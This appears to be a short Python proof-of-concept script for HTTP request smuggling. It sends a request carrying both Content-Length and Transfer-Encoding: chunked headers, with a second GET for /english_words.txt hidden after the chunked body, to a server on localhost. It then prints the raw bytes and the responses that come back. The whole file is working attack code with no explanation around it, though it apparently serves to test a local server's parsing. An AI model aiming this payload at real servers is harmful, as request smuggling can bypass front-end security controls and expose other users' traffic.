import socket, sys, time
port = int(sys.argv[1])
body = b"0\r\n\r\n"
smuggled = b"GET /english_words.txt HTTP/1.1\r\nHost: x\r\n\r\n"
req = (b"GET /helloworld.html HTTP/1.1\r\nHost: x\r\n"
       b"Content-Length: " + str(len(body) + len(smuggled)).encode() + b"\r\n"
       b"Transfer-Encoding: chunked\r\n\r\n" + body + smuggled)
print("--- bytes sent ---"); print(req.decode().replace("\r\n", "\\r\\n\n"))
s = socket.create_connection(("localhost", port), timeout=3)
s.sendall(req)
d = b""; end = time.time() + 3
while time.time() < end:
    try:
        c = s.recv(65536)
    except socket.timeout:
        break
    if not c: break
    d += c
print("--- responses ---")
for part in d.split(b"HTTP/1.1 ")[1:]:
    h = part.split(b"\r\n\r\n")[0].decode().replace("\r\n", " | ")
    print("HTTP/1.1", h)
print("total bytes received:", len(d))
